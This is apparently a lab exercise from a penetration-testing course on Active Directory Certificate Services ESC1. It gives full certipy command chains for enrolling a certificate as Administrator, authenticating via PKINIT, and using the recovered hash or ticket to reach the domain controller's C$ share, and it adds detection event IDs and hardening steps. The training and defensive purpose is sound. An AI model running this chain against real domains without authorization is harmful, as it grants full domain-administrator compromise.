    Exercise 4.6: ADCS ESC1

    Before You Begin

    In June 2021 SpecterOps published "Certified Pre-Owned" and a series of follow-on papers cataloging Active Directory Certificate Services misconfigurations. They labeled the most common ones ESC1 through ESC15. ESC1 is the canonical "you can request a certificate as anyone" finding: a certificate template configured to (a) allow low-privileged users to enroll, (b) include client-authentication EKU, (c) require no manager approval, (d) let the requestor specify the Subject Alternative Name (SAN). The combination means a domain user can request a cert with SAN=Administrator, then authenticate to AD via PKINIT as Administrator.

    Exercise 4.6 targets the per-token template WebSrv_<token> on Nordport's Enterprise CA. Find it, request a cert as Administrator, use it to authenticate, read the per-token flag.

    Tools required: certipy. Pre-installed on Kali.

    Scenario

    Marcus Bell: "AD CS templates control who can request what kind of certificate. A template that lets a regular user request a certificate for ANY identity (via Subject Alternative Name) is a Domain Admin button. Find the per-token vulnerable template, request a cert as Administrator, authenticate, profit."

    The flag is \\corp-dc01\C$\esc1_flag_<token>.txt, readable as Administrator.

    Credentials:

    Username Password
    j.chen Welcome2026#

    Domain: corp.nordport.local CA host: corp-ca01

    Your Objectives

    • Use certipy find to enumerate vulnerable templates
    • Confirm WebSrv_<token> shows ESC1
    • Request a certificate with SAN = Administrator
    • Authenticate via PKINIT with certipy
    • Use the recovered Administrator NTLM hash (or TGT) to read the per-token flag

    What Defines ESC1 (and What to Look For Next)

    ESC1 is one of fifteen ADCS misconfigurations catalogued by SpecterOps. The table below names the few you will actually meet on most engagements.

    Finding Triggering condition Impact
    ESC1 Template lets enrollee supply SAN, low-priv enroll, client-auth EKU, no manager approval Cert as any user
    ESC2 Template has Any-Purpose or No EKU Cert usable for anything
    ESC3 Enrollment Agent template combined with weak signing requirement Sign on behalf of others
    ESC4 Template object has weak DACL allowing edit Modify template into ESC1
    ESC6 CA flag EDITF_ATTRIBUTESUBJECTALTNAME2 set Every template behaves as SAN-supply
    ESC8 CA Web Enrollment endpoint accepts NTLM, no EPA Coerce + relay (covered in 4.7)

    Background: AD CS Templates and the SAN-Supply Trap

    A certificate template defines who can request what kind of certificate. The relevant fields:

    Field Effect
    Enrollment permissions Which principals can request the cert (often Authenticated Users or Domain Users for self-service templates)
    Manager Approval If on, requests pend until an admin approves
    Authorized Signatures (RA) If > 0, requires N pre-existing certificate signatures to enroll
    EKU (Extended Key Usage) What the cert is good for: Client Authentication, Smart Card Logon, Server Authentication, etc.
    Subject construction Either Built from this AD information (the requestor's identity) or Supply in the request (the requestor names the subject)
    Subject Alternative Name (SAN) Either Built from AD or Enrollee supplies subject (with CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)

    ESC1 is the combination: - Anyone can enroll (or any low-privileged group) - Client Authentication EKU - No manager approval - No RA signature required - Enrollee supplies subject (or SAN)

    When the enrollee supplies the SAN, the cert can be issued for any UPN the requestor names. PKINIT (RFC 4556) is the Kerberos extension that lets a client authenticate using a public key bound to a UPN. So a cert with SAN=Administrator@corp.local plus PKINIT = Administrator's TGT.

    The CA flag that closes the loophole

    Microsoft published EDITF_ATTRIBUTESUBJECTALTNAME2 as a CA-level configuration. When set, the CA accepts SAN values from the request even on templates that should not allow it. Setting EDITF_ATTRIBUTESUBJECTALTNAME2 turns every template into ESC6 (a separate finding). Defenders should ensure it is NOT set:

    certutil -getreg policy\EditFlags

    If EDITF_ATTRIBUTESUBJECTALTNAME2 appears in the result, the CA is globally vulnerable to ESC6 regardless of template settings.

    Why PKINIT yields the NTLM hash too

    PKINIT authentication issues a TGT, but certipy auth also extracts the NTLM hash of the authenticated user from the PAC's PAC_CREDENTIAL_INFO field, which the KDC populates when it issues the TGT in response to PKINIT. So a successful certipy auth as Administrator gives you both a usable TGT (immediately) and the NTLM hash (for pass-the-hash to non-Kerberos services). The NTLM hash extraction was disabled in Microsoft's May 2022 PKINIT hardening (PerformTicketSignature = 1); on hardened DCs you only get the TGT.

    Tool Primer

    certipy find (template enumeration)

    certipy find -u j.chen@corp.nordport.local -p 'Welcome2026#' \
  -dc-ip <dc_ip> -vulnerable -enabled

    Output reports every vulnerable template with its ESC classification: [!] Certificate template "WebSrv_<token>" is vulnerable to ESC1.

    certipy req (request a cert)

    certipy req -u j.chen@corp.nordport.local -p 'Welcome2026#' \
  -ca Nordport-Issuing-CA -template WebSrv_<token> \
  -upn administrator@corp.nordport.local \
  -dc-ip <dc_ip>
    Flag Effect
    -ca CA name (from certipy find output)
    -template template name
    -upn the SAN value (the identity you are claiming)
    - Output: administrator.pfx (the cert + private key)

    certipy auth (PKINIT)

    certipy auth -pfx administrator.pfx -dc-ip <dc_ip>

    Output: a Kerberos TGT cached at administrator.ccache plus, on un-hardened DCs, the NTLM hash printed to stdout.

    Walkthrough

    Step 1: Enumerate Vulnerable Templates

    certipy find walks every certificate template, evaluates each against the ESC1 through ESC15 checklists, and prints which findings apply. The -vulnerable -enabled filter restricts output to enabled templates that are actually exploitable; without these flags certipy lists every template (useful for inventory, noisy for attack).

    Kali - certipy find vulnerable

    certipy find -u j.chen@corp.nordport.local -p 'Welcome2026#' \
  -dc-ip <dc_ip> -vulnerable -enabled \
  -text -output adcs_find
less adcs_find_Certipy.txt
    Flag Effect
    -u <user>@<realm> Authentication; certipy uses Kerberos by default.
    -p '<pw>' Password.
    -dc-ip <ip> KDC IP.
    -vulnerable Restrict output to templates with at least one ESC finding.
    -enabled Only enabled templates (disabled templates cannot be used regardless).
    -text Render output as readable text (default is JSON).
    -output <stem> Write the report to <stem>_Certipy.txt.

    Search for WebSrv_${OCR_SCOPE_TOKEN} in the output. Confirm it is flagged ESC1 with the four enabling conditions listed.

    Step 2: Request a Certificate as Administrator

    certipy req is the equivalent of Windows' certreq.exe. With -upn, certipy populates the SAN field of the CSR with the chosen UPN. The CA accepts because the template's CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag is set; it issues a cert whose Subject Alternative Name says administrator@corp.nordport.local even though the requestor is j.chen.

    Kali - Request the cert

    cd ~/work && mkdir -p adpt-4-06 && cd adpt-4-06
certipy req -u j.chen@corp.nordport.local -p 'Welcome2026#' \
  -ca Nordport-Issuing-CA \
  -template "WebSrv_${OCR_SCOPE_TOKEN}" \
  -upn 'administrator@corp.nordport.local' \
  -dc-ip <dc_ip>
    Flag Effect
    -ca <name> CA name as listed in Step 1 (certipy find output shows it).
    -template <name> Template name to enroll against.
    -upn <upn> Identity to claim in the SAN. The CA does not validate this against the requestor.

    Output: administrator.pfx written to the current directory. The PFX bundles the cert and the private key; certipy uses an empty password by default (-pfx-password '' to specify).

    Step 3: Authenticate via PKINIT

    PKINIT (RFC 4556) is the Kerberos extension that lets a client authenticate with a public/private keypair instead of a password. The KDC validates the cert chain back to a trusted root and matches the SAN against an AD principal; the AS-REP includes a TGT for the matched principal. On un-hardened DCs the AS-REP also carries a PAC_CREDENTIAL_INFO blob containing the user's NTLM hash (Microsoft's pre-2022 behavior).

    Kali - certipy auth

    certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
    Flag Effect
    -pfx <file> The cert + key bundle from Step 2.
    -dc-ip <ip> KDC for the AS exchange.

    Output includes the NTLM hash for Administrator (on un-hardened DCs) and stores a TGT at administrator.ccache.

    Step 4: Read the Flag

    Two paths. Both reach the same file via the same Administrator identity; pick whichever is convenient.

    Option A: pass-the-hash via NTLM. Works against any NTLM-accepting service (SMB, WMI, WinRM with -H):

    Kali - PtH with the recovered Administrator hash

    smbclient //corp-dc01.corp.nordport.local/C$ \
  -U Administrator --pw-nt-hash <hash> \
  -c "get esc1_flag_${OCR_SCOPE_TOKEN}.txt"
cat esc1_flag_${OCR_SCOPE_TOKEN}.txt
    Token Effect
    --pw-nt-hash <hash> Authenticate using the NTLM hash directly (no password computation).

    Option B: use the cached TGT. Works against Kerberos-accepting services and survives PKINIT hardening:

    Kali - Use the Kerberos ticket

    export KRB5CCNAME=administrator.ccache
smbclient //corp-dc01.corp.nordport.local/C$ -k \
  -c "get esc1_flag_${OCR_SCOPE_TOKEN}.txt"
cat esc1_flag_${OCR_SCOPE_TOKEN}.txt

    Either path reads the file. Submit the OCR{...} value.

    Common gotchas

    • Wrong CA name: -ca takes the CA's display name (often <Org>-<Server>-CA), not the host. certipy find shows the right value.
    • Template name case: PowerShell-managed templates are case-insensitive; certipy is strict. Use the exact name from certipy find.
    • PKINIT hardening (May 2022): on hardened DCs, Step 3 prints Got NULL credentials section instead of the NTLM hash. Option A fails; Option B still works.
    • Clock skew: PKINIT enforces the same 5-minute Kerberos clock skew rule. Sync first if Step 3 returns KRB_AP_ERR_SKEW.
    • Cert lifetime: the issued cert typically has a 1-year lifetime. Hold on to the PFX; you can re-auth without going through Step 2 again.

    Blue Team Perspective

    Certificate enrollment generates dedicated events that defenders can pivot on. Most environments do not collect them.

    Activity Event ID Where it fires
    Certificate issued 4886, 4887 CA Security log
    Certificate request received 4888 CA Security log
    PKINIT logon 4768 with Certificate Issuer Name field populated DC Security log
    Defender for Identity "Suspected ADCS abuse" MDI

    What gets caught and what does not

    Most ADCS abuse goes undetected because few SOCs ingest CA event logs. The single best detection is on event 4886/4887 with Subject = Administrator (or any privileged account) issued via a non-SmartCard-Logon template. SIEM rule: alert on any cert issuance where the Subject does not match the requesting principal's UPN. Cardinality is low; signal is very high.

    Hardening Note

    Every SpecterOps ESC has a one-line fix. The work is finding them; the change is small.

    ESC1 hardening

    • Run certipy find -vulnerable -enabled against your own environment monthly. Each hit is a finding.
    • On each ESC1 template: clear CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT OR scope enrollment to a specific group OR delete the template if unused.
    • Disable RC4-only PKINIT (forces strong ticket sigs).
    • Apply Microsoft's May 2022 PKINIT hardening (PerformTicketSignature = 1, KrbtgtFullPacSignature = 2).
    • Audit the CA-level setting EDITF_ATTRIBUTESUBJECTALTNAME2; remove if present (eliminates ESC6).
    • Forward CA event log (4886, 4887, 4888) to the SIEM with retention long enough for slow-burn abuse.

    Analysis Questions

    1. The defender mitigation for ESC1 is to either disable enrollee-supplies-subject on the template or to turn off Authenticated Users enrollment. What is the operational trade-off?

    Reveal Answer

    Disabling enrollee-supplies-subject is the surgical fix: the template still serves its intended purpose (issuing certs whose subject is built from AD), and ESC1 vanishes. The template's legitimate users may be inconvenienced if they need to specify a non-AD subject (uncommon for client-auth templates, common for web-server templates that need a specific FQDN in the SAN). Disabling Authenticated Users enrollment scopes the template to a specific group; it kills the broad attack surface but requires the operator to know which principals legitimately need the cert. Both fixes are typical recommendations; the choice depends on what the template is for. Most templates flagged as ESC1 in production are misconfigurations of templates that were never used for their intended purpose; deletion is often the right answer.

    2. PKINIT yields both a TGT and (on un-hardened DCs) the NTLM hash. Microsoft hardened this with PerformTicketSignature in May 2022. What changes for the attacker on a hardened DC?

    Reveal Answer

    On a DC with PerformTicketSignature = 1 (the May 2022 hardening), PKINIT-issued TGTs include a Ticket Signature; the KDC no longer populates the PAC_CREDENTIAL_INFO with the user's NTLM hash. The attacker still gets a usable TGT (and so can authenticate to any Kerberos-aware service as Administrator), but cannot recover the NTLM hash directly. Effects on the attacker: (a) loses pass-the-hash to NTLM-only services; (b) loses overpass-the-hash convenience; (c) must use the TGT for everything, which means using -k Kerberos-aware tools and ensuring time skew is minimal. The TGT alone is still essentially Domain Admin equivalent for any Kerberos-accepting service. The hardening reduces blast radius but does not close the underlying ESC1 attack.

    3. The CA-wide setting EDITF_ATTRIBUTESUBJECTALTNAME2 is a stronger version of ESC1 (it makes every template SAN-supplyable regardless of template flags). Why does Microsoft offer this setting at all?

    Reveal Answer

    Some legitimate CA enrollment scenarios from the early 2000s required the requestor to populate the SAN at enrollment time even on templates that did not have the explicit CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag set; certain web-server enrollment workflows and downlevel client integrations expected this. Microsoft kept the CA-level flag for backwards compatibility. The setting is essentially never needed in modern environments; defenders should ensure it is NOT set:

    certutil -getreg policy\EditFlags

    The output should not contain EDITF_ATTRIBUTESUBJECTALTNAME2. If it does, that is ESC6: every template on that CA accepts attacker-supplied SANs regardless of template configuration, and the entire CA is one cert request away from full Domain Admin compromise. Remove with certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2.

    Key Takeaways

    • ESC1 = enrollee supplies SAN + low-privileged enrollment + client auth EKU + no manager approval.
    • certipy find -vulnerable enumerates every misconfigured template in one call.
    • certipy req -upn administrator@... requests a cert as the Administrator account.
    • certipy auth performs PKINIT and (on un-hardened DCs) prints the NTLM hash.
    • Defender mitigations: disable enrollee-supplies-subject, scope enrollment to specific groups, audit EDITF_ATTRIBUTESUBJECTALTNAME2.

    Cheat Sheet Recap

    The four operations below cover the entire ESC1 chain. Pin this card; certipy is the only tool you need for most ADCS attacks in 2026.

    Goal Command
    Find vulnerable templates certipy find -u <user>@<domain> -p '<pw>' -dc-ip <dc> -vulnerable -enabled
    Request cert with SAN certipy req -u <user>@<domain> -p '<pw>' -ca <CA-name> -template <Template> -upn administrator@<domain> -dc-ip <dc>
    PKINIT auth + recover hash certipy auth -pfx administrator.pfx -dc-ip <dc>
    Use ticket on hardened DC export KRB5CCNAME=administrator.ccache; smbclient //<dc>/C$ -k -c "ls"

    Spaced Repetition

    Card 1: certipy find Vulnerable

    Q: Write the certipy find command to enumerate vulnerable enabled templates as j.smith@corp.local / Pass# against DC 10.10.10.10.

    Answer 
    certipy find -u j.smith@corp.local -p 'Pass#' \
  -dc-ip 10.10.10.10 -vulnerable -enabled

    Add -text -output report for a written summary. The output classifies each finding by ESC number (ESC1 through ESC15) with a short explanation.

    Card 2: certipy req as Administrator

    Q: Write the certipy req command to enroll a cert via the WebSrv template on CA Acme-CA for SAN administrator@corp.local, authenticating as j.smith / Pass#.

    Answer 
    certipy req -u j.smith@corp.local -p 'Pass#' \
  -ca Acme-CA -template WebSrv \
  -upn administrator@corp.local \
  -dc-ip 10.10.10.10

    Output: administrator.pfx. The PFX contains the private key and the cert; default password is empty.

    Card 3: certipy auth PKINIT

    Q: Write the command to authenticate to AD using administrator.pfx and recover the TGT + NTLM hash.

    Answer 
    certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10

    Output: TGT cached at administrator.ccache, NTLM hash printed to stdout (un-hardened DCs only). On May-2022-hardened DCs, the hash is no longer included; only the TGT is usable.

    Card 4: ESC1 Definition

    Q: List the four template properties that together define ESC1.

    Answer
    1. Low-privileged enrollment permissions (Authenticated Users, Domain Users, etc.). 2. Client Authentication or Smart Card Logon EKU. 3. No manager approval required. 4. CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT set (or any equivalent that lets the requestor populate the SAN). All four must be true; missing any breaks the chain.

    Card 5: PKINIT Hardening

    Q: What did Microsoft's May 2022 PKINIT hardening (PerformTicketSignature = 1) change, and what does the attacker lose?

    Answer

    The KDC adds a Ticket Signature to PKINIT-issued TGTs and stops populating PAC_CREDENTIAL_INFO with the user's NTLM hash. The attacker loses easy pass-the-hash from a PKINIT-recovered cert; they still get a working TGT but cannot use the NTLM hash on NTLM-only protocols. The TGT alone remains effectively Domain Admin for Kerberos-accepting services, so the attack is reduced in scope but not closed.
